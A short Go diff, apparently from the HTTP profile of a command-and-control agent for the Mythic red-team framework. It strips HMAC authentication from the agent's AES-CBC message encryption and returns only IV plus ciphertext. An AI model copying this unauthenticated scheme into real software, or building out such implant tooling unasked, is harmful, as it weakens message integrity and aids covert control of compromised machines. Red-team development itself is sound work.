@@ -4,9 +4,7 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
-	"crypto/hmac"
 	"crypto/rand"
-	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
@@ -275,7 +273,7 @@ func getString(m map[string]interface{}, key string) string {
 	return ""
 }
 
-// encryptMessage encrypts a message using AES with HMAC
+// encryptMessage encrypts a message using AES-CBC (simplified like Freyja)
 func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	if h.EncryptionKey == "" {
 		return msg
@@ -318,16 +316,8 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	encrypted := make([]byte, len(padded))
 	mode.CryptBlocks(encrypted, padded)
 	
-	// Prepend IV to encrypted data
-	result := append(iv, encrypted...)
-	
-	// Create HMAC
-	hmacHash := hmac.New(sha256.New, key)
-	hmacHash.Write(result)
-	hmacBytes := hmacHash.Sum(nil)
-	
-	// Prepend HMAC to result
-	return append(hmacBytes, result...)
+	// Return IV + encrypted data (let Mythic handle HMAC)
+	return append(iv, encrypted...)
 }
 
 // pkcs7Pad adds PKCS#7 padding
